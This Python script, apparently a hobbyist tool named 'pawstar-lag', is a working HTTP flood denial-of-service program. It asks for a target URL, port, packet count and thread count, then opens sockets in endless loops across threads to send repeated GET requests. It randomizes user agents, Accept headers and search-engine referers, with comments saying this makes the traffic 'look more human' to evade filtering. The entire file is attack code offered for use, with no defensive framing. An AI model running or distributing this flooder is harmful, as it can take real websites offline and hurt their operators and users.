import socket
import random
import threading
print('''                 _                    _              
                         | |                  | |            
 _ __   __ ___      _____| |_ __ _ _ __ ______| | __ _  __ _ 
| '_ \ / _` \ \ /\ / / __| __/ _` | '__|______| |/ _` |/ _` |
| |_) | (_| |\ V  V /\__ \ || (_| | |         | | (_| | (_| |
| .__/ \__,_| \_/\_/ |___/\__\__,_|_|         |_|\__,_|\__, |
| |                                                     __/ |
|_|                                                    |___/
Created by pawstar-lag
Contact: foxxxqi_qsd1@protonmail.com
Any impovements needed? Feel free to pull request!
''')
url=str(input("[+] Enter the target URL: "))
port=int(input("[+] Enter the port to attack: "))
pack=int(input("[+] Enter the number of packets in each request: "))
tn=int(input("[+] Enter the number of threads (higher threads, faster packet sending, but more internet bandwith used): "))
# damn a lot of user agents
useragents = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
              "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
              "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
              "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
              "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
              "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
              "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
              "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
              "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
              "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
              "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
              "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
              "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
              "Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
              "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
              "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
              # opera
              "Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)",
              "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10",
              "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
              "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10",
              "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15",
              "Opera/9.20 (Windows NT 6.0; U; en)",
              "Opera/5.0 (SunOS 5.8 sun4m; U) [en]",
              "Opera/8.51 (Windows NT 5.1; U; en)",
              "Opera/8.53 (Windows NT 5.1; U; en)",
              "Opera/8.01 (Windows NT 5.0; U; de)",
              "Opera/8.54 (Windows NT 5.1; U; de)",
              "Opera/8.53 (Windows NT 5.0; U; en)",
              "Opera/8.01 (Windows NT 5.1; U; de)",
              "Opera/8.50 (Windows NT 5.1; U; de)"
]
# make it look more human
acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept-Language: en-US,en;q=0.5\r\n"
]
# make it look more human by looking like a search engine
ref = ['http://www.bing.com/search?q=',
       'http://www.yandex.com/yandsearch?text=',
       'https://duckduckgo.com/?q=',
       'https://google.com/search?q=',
       'http://www.ted.com/search?q=',
       'http://www.reddit.com/search?q=',
       'http://google.ca/search?q=',
       'http://ask.com/web?q=',
       'http://en.wikipedia.org/w/index.php?search=',
       # for ukraine
       'http://google.ua/search?q='
]
# ua for ukraine
ua = "User-Agent: " + random.choice(useragents) + "\r\n"
accept = random.choice(acceptall)
reffer = "Referer: " + random.choice(ref) + url + "\r\n"
content = "Content-Type: application/x-www-form-urlencoded\r\n"
length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(url), int(port))
req_args = target_host + ua + accept + reffer + content + length + "\r\n"
def httpspam():
  xx = int(0)
  while True:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      xx+=1
      s.connect((url, port))
      s.send(str.encode(req_args))
      for i in range(pack):
        s.send(str.encode(req_args))
      print("[+] HTTP request {0} sent to {1}:{2}".format(str(xx),url,str(port)))
# threading
for i in range(tn):
  t = threading.Thread(target=httpspam)
  print("[+] Thread {0} created".format(str(i)))
  t.start()
  t.join()
